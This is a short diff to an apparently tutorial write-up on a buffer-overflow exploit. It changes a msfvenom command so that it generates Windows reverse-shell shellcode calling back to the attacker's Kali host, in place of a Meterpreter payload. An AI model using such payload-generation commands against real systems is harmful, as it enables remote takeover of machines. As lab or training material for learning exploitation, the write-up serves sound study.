@@ -319,7 +319,7 @@ Now that we know we control the EIP, we can generate a reverse shell.
 ### Reverse shell
 
 Using msfvenom we can create a reverse shell. Using the command
-** msfvenom -p windows/meterpreter/reverse_tcp lhost=kali ip lport= kali port exitfunc=thread -f c -a x86 -b "\x00"**
+** msfvenom -p windows/shell_reverse_tcp lhost=kali ip lport= kali port exitfunc=thread -f c -a x86 -b "\x00"**
 where
 * -p means payload we want to use
 * lhost - kali ip address
